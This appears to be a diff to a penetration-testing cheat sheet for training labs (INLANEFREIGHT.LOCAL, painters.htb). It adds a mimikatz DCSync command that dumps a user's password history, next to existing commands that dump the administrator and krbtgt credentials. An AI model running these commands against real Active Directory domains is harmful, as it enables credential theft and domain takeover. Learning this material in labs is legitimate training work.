@@ -247,5 +247,6 @@ inlanefreight_hashes.ntds  inlanefreight_hashes.ntds.cleartext  inlanefreight_ha
 ```
 .\mimikatz.exe  "privilege::debug" "lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator"
 .\mimikatz.exe  "privilege::debug" "lsadump::dcsync /domain:painters.htb /user:painters.htb\krbtgt /all /csv"
+.\mimikatz.exe  "privilege::debug" "lsadump::dcsync /user:painters\matt /history"
 
 ```
